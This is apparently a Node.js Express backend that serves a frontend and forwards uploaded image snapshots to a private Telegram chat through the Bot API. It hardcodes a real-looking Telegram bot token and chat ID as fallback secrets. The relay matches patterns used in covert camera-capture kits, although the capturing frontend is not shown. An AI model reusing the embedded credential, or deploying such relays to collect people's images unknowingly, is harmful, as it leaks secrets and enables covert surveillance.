const path = require('path');
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// Keep hardcoded defaults
const DEFAULT_BOT_TOKEN = '6047507658:AAGHC5tFppE2yqLpQi4KOrz7TwGeM0Mc-LI';
const DEFAULT_CHAT_ID = '5574741182';

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || DEFAULT_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('Warning: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set. Upload endpoint will return 500.');
}

app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Serve built frontend
const distPath = path.join(__dirname, '..', 'dist');
app.use(express.static(distPath));

// API route
app.post('/api/upload-photo', async (req, res) => {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ ok: false, error: 'Server not configured with TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID' });
    }

    const { dataUrl, caption } = req.body;
    if (!dataUrl || typeof dataUrl !== 'string' || !dataUrl.startsWith('data:image/')) {
      return res.status(400).json({ ok: false, error: 'Invalid or missing dataUrl' });
    }

    const matches = dataUrl.match(/^data:(image\/\w+);base64,(.+)$/);
    if (!matches) return res.status(400).json({ ok: false, error: 'Invalid data URL format' });

    const mime = matches[1];
    const b64 = matches[2];
    const buffer = Buffer.from(b64, 'base64');

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', buffer, { filename: 'snapshot.jpg', contentType: mime });
    if (caption) form.append('caption', caption);

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    const resp = await fetch(url, { method: 'POST', body: form });
    const json = await resp.json();

    if (!json.ok) {
      console.error('Telegram API error:', json);
      return res.status(500).json({ ok: false, error: 'Telegram API error', telegram: json });
    }

    return res.json({ ok: true, result: json.result });
  } catch (err) {
    console.error('Upload error:', err);
    return res.status(500).json({ ok: false, error: String(err) });
  }
});

// SPA fallback
app.get('*', (req, res) => {
  res.sendFile(path.join(distPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
  
